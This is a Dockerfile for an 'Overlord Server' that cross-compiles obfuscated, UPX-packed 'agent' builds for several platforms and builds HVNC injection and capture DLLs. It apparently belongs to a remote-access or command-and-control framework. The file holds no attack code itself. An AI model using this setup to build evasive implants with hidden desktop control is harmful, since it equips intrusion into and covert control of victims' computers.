# syntax=docker/dockerfile:1.7
# Overlord Server Dockerfile
FROM oven/bun:1 AS base
WORKDIR /app

# Install Go for agent building and other tools
RUN apt-get update \
    && apt-get install -y --no-install-recommends \
    build-essential \
    gcc-mingw-w64-x86-64 \
    g++-mingw-w64-x86-64 \
    gcc-mingw-w64-i686 \
    musl-tools \
    gcc-aarch64-linux-gnu \
    gcc-arm-linux-gnueabihf \
       openssl \
       curl \
       ca-certificates \
       wget \
       git \
       unzip \
       upx-ucl \
    && rm -rf /var/lib/apt/lists/*

# Install Go (latest stable version)
ENV GO_VERSION=1.26.2
ARG TARGETARCH
RUN case "${TARGETARCH}" in \
        amd64) GO_ARCH=amd64 ;; \
        arm64) GO_ARCH=arm64 ;; \
        *) echo "Unsupported architecture: ${TARGETARCH}" >&2; exit 1 ;; \
    esac \
    && wget -q https://go.dev/dl/go${GO_VERSION}.linux-${GO_ARCH}.tar.gz \
    && tar -C /usr/local -xzf go${GO_VERSION}.linux-${GO_ARCH}.tar.gz \
    && rm go${GO_VERSION}.linux-${GO_ARCH}.tar.gz

ENV PATH="/usr/local/go/bin:${PATH}"
ENV GOPATH="/go"
ENV PATH="${GOPATH}/bin:${PATH}"
ENV GOCACHE=/root/.cache/go-build
ENV GOMODCACHE=/go/pkg/mod

# Install garble for obfuscated agent builds (requires Go 1.25+)
RUN --mount=type=cache,target=/root/.cache/go-build \
    --mount=type=cache,target=/go/pkg/mod \
    go install mvdan.cc/garble@latest

# Install Android NDK for Android cross-compilation
ENV ANDROID_NDK_VERSION=r27c
ENV ANDROID_NDK_HOME=/opt/android-ndk
RUN case "${TARGETARCH}" in \
        amd64) NDK_HOST="linux-x86_64" ;; \
        arm64) NDK_HOST="linux-aarch64" ;; \
        *) echo "Unsupported architecture for Android NDK: ${TARGETARCH}" >&2; exit 1 ;; \
    esac \
    && wget -q "https://dl.google.com/android/repository/android-ndk-${ANDROID_NDK_VERSION}-linux.zip" \
    && unzip -q android-ndk-${ANDROID_NDK_VERSION}-linux.zip \
    && mv android-ndk-${ANDROID_NDK_VERSION} ${ANDROID_NDK_HOME} \
    && rm android-ndk-${ANDROID_NDK_VERSION}-linux.zip

# Copy package files and lockfile
COPY Overlord-Server/package.json Overlord-Server/bun.lock* ./

# Install dependencies
RUN bun install --frozen-lockfile

# Copy source code and client code (needed for builds)
COPY Overlord-Server/ ./
COPY Overlord-Client/ ./Overlord-Client/

# Copy HVNCInjection source and build script for cross-compilation
COPY HVNCInjection/ ./HVNCInjection/
COPY build-hvnc-dll.sh ./build-hvnc-dll.sh

# Copy HVNCCapture source and build script for cross-compilation
COPY HVNCCapture/ ./HVNCCapture/
COPY build-hvnc-capture-dll.sh ./build-hvnc-capture-dll.sh

# Use MSVC-built HVNCInjection DLL if present (preferred, from CI artifact).
# Fall back to cross-compiling with mingw only if no pre-built DLL exists.
RUN if [ -f dist-clients/HVNCInjection.x64.dll ]; then \
      echo "Using pre-built MSVC HVNCInjection DLL"; \
    else \
      chmod +x build-hvnc-dll.sh && \
      HVNC_SRC_DIR=HVNCInjection/src HVNC_OUT_DIR=dist-clients bash build-hvnc-dll.sh || \
      echo "WARNING: HVNCInjection DLL not available (build with MSVC on Windows)"; \
    fi

# Use MSVC-built HVNCCapture DLL if present (preferred, from CI artifact).
# Fall back to cross-compiling with mingw (C++) only if no pre-built DLL exists.
RUN if [ -f dist-clients/HVNCCapture.x64.dll ]; then \
      echo "Using pre-built MSVC HVNCCapture DLL"; \
    else \
      chmod +x build-hvnc-capture-dll.sh && \
      HVNC_CAPTURE_SRC_DIR=HVNCCapture/src HVNC_CAPTURE_OUT_DIR=dist-clients bash build-hvnc-capture-dll.sh || \
      echo "WARNING: HVNCCapture DLL not available (build with MSVC on Windows)"; \
    fi

# Create necessary directories
RUN mkdir -p certs public data

# Build production server bundle and ensure Tailwind CSS is present
RUN bun run build && test -s ./public/assets/tailwind.css

# Expose the default port
EXPOSE 5173

# Set environment variables (can be overridden)
ENV PORT=5173
ENV HOST=0.0.0.0
ENV DATA_DIR=/app/data
ENV NODE_ENV=production

# Run the production build
CMD ["bun", "run", "dist/index.js"]
